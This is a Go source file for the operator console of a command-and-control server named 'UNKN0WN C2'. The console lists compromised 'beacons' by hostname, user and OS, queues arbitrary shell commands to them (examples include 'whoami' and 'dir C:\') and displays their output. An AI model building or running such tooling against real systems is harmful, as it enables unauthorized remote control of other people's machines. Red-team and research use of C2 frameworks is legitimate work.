package main

import (
	"bufio"
	"fmt"
	"log"
	"os"
	"strings"
	"sync"
	"time"
)

// Console state management
var (
	consoleMutex  sync.Mutex
	consoleActive bool
	logCounter    int
)

// ConsoleLogger wraps the standard logger to preserve console input
type ConsoleLogger struct {
	*log.Logger
}

// Printf prints a log message while preserving the console input line
func (cl *ConsoleLogger) Printf(format string, v ...interface{}) {
	if !consoleActive {
		// If console isn't active, use normal logging
		cl.Logger.Printf(format, v...)
		return
	}

	consoleMutex.Lock()
	defer consoleMutex.Unlock()

	logCounter++

	// Print a separator line and the log message
	fmt.Printf("\n--- Log #%d ---\n", logCounter)
	cl.Logger.Printf(format, v...)
	fmt.Println("------")
	fmt.Print("c2> ")
}

// Global console logger instance
var consoleLogger *ConsoleLogger

// initConsoleLogger initializes the console-aware logger
func initConsoleLogger() {
	consoleLogger = &ConsoleLogger{
		Logger: log.New(os.Stdout, "", log.LstdFlags),
	}
}

// logf is a convenience function for console-aware logging
func logf(format string, v ...interface{}) {
	if consoleLogger != nil {
		consoleLogger.Printf(format, v...)
	} else {
		log.Printf(format, v...)
	}
}

// startC2Console starts an interactive console for C2 management
// startC2Console starts an interactive console for C2 management
func startC2Console() {
	// Initialize console logging
	initConsoleLogger()

	fmt.Println("\n=== UNKN0WN C2 Management Console ===")
	fmt.Println("Type 'help' for available commands")

	consoleActive = true
	defer func() { consoleActive = false }()

	scanner := bufio.NewScanner(os.Stdin)

	for {
		fmt.Print("c2> ")

		if !scanner.Scan() {
			break
		}

		input := strings.TrimSpace(scanner.Text())

		if input == "" {
			continue
		}

		parts := strings.Fields(input)
		command := strings.ToLower(parts[0])

		switch command {
		case "help", "?":
			printC2Help()

		case "status", "st":
			c2Manager.PrintStatus()

		case "beacons", "list":
			listBeacons()

		case "tasks":
			listTasks()

		case "task", "cmd":
			if len(parts) < 3 {
				fmt.Println("Usage: task <beacon_id> <command>")
				continue
			}
			beaconID := parts[1]
			command := strings.Join(parts[2:], " ")
			taskID := c2Manager.AddTask(beaconID, command)
			if taskID != "" {
				fmt.Printf("Task %s queued for beacon %s\n", taskID, beaconID)
			} else {
				fmt.Printf("Failed to queue task (beacon %s not found)\n", beaconID)
			}

		case "result", "res":
			if len(parts) < 2 {
				fmt.Println("Usage: result <task_id>")
				continue
			}
			taskID := parts[1]
			showTaskResult(taskID)

		case "clear":
			// Clear screen (simple version)
			fmt.Print("\033[2J\033[H")
			// Reset log counter since screen is cleared
			consoleMutex.Lock()
			logCounter = 0
			consoleMutex.Unlock()

		case "logs":
			consoleMutex.Lock()
			count := logCounter
			consoleMutex.Unlock()
			fmt.Printf("Total log messages since start/clear: %d\n", count)

		case "exit", "quit":
			fmt.Println("Exiting C2 console...")
			time.Sleep(1 * time.Second)
			os.Exit(0)
			return

		default:
			fmt.Printf("Unknown command: %s (type 'help' for available commands)\n", command)
		}
	}
}

func printC2Help() {
	fmt.Print(`
Available Commands:
  help, ?              - Show this help menu
  status, st           - Show C2 server status
  beacons, list        - List all registered beacons
  tasks                - List all tasks and their status
  task <id> <cmd>      - Queue a command for a specific beacon
  result <task_id>     - Show result of a completed task
  logs                 - Show count of log messages since start/clear
  clear                - Clear screen and reset log counter
  exit, quit           - Exit console

Examples:
  task a1b2 whoami
  task a1b2 dir C:\
  result T1001

Note: Log messages appear between markers while you type.
      Your input is preserved - continue typing after logs appear.

`)
}

func listBeacons() {
	beacons := c2Manager.GetBeacons()

	if len(beacons) == 0 {
		fmt.Println("No beacons registered")
		return
	}

	fmt.Printf("\nRegistered Beacons (%d):\n", len(beacons))
	fmt.Printf("%-10s %-20s %-15s %-10s %-12s %-8s %s\n",
		"ID", "Hostname", "User", "OS", "Arch", "Queue", "Last Seen")
	fmt.Println(strings.Repeat("-", 95))

	for _, beacon := range beacons {
		fmt.Printf("%-10s %-20s %-15s %-10s %-12s %-8d %s\n",
			beacon.ID,
			truncateString(beacon.Hostname, 20),
			truncateString(beacon.Username, 15),
			beacon.OS,
			beacon.Arch,
			len(beacon.TaskQueue),
			beacon.LastSeen.Format("15:04:05"))
	}
	fmt.Println()
}

func listTasks() {
	tasks := c2Manager.GetTasks()

	if len(tasks) == 0 {
		fmt.Println("No tasks found")
		return
	}

	fmt.Printf("\nTasks (%d):\n", len(tasks))
	fmt.Printf("%-8s %-10s %-10s %-40s %s\n",
		"Task ID", "Beacon", "Status", "Command", "Created")
	fmt.Println(strings.Repeat("-", 85))

	for _, task := range tasks {
		fmt.Printf("%-8s %-10s %-10s %-40s %s\n",
			task.ID,
			task.BeaconID,
			task.Status,
			truncateString(task.Command, 40),
			task.CreatedAt.Format("15:04:05"))
	}
	fmt.Println()
}

func showTaskResult(taskID string) {
	tasks := c2Manager.GetTasks()
	task, exists := tasks[taskID]

	if !exists {
		fmt.Printf("Task %s not found\n", taskID)
		return
	}

	fmt.Printf("\nTask %s Details:\n", taskID)
	fmt.Printf("  Beacon ID: %s\n", task.BeaconID)
	fmt.Printf("  Command:   %s\n", task.Command)
	fmt.Printf("  Status:    %s\n", task.Status)
	fmt.Printf("  Created:   %s\n", task.CreatedAt.Format("2006-01-02 15:04:05"))

	if task.SentAt != nil {
		fmt.Printf("  Sent:      %s\n", task.SentAt.Format("2006-01-02 15:04:05"))
	}

	if task.Result != "" {
		fmt.Printf("  Result (%d chars):\n", len(task.Result))
		fmt.Println(strings.Repeat("-", 50))
		fmt.Println(task.Result)
		fmt.Println(strings.Repeat("-", 50))
	} else {
		fmt.Println("  Result: (no result yet)")
	}
	fmt.Println()
}

func truncateString(s string, maxLen int) string {
	if len(s) <= maxLen {
		return s
	}
	return s[:maxLen-3] + "..."
}
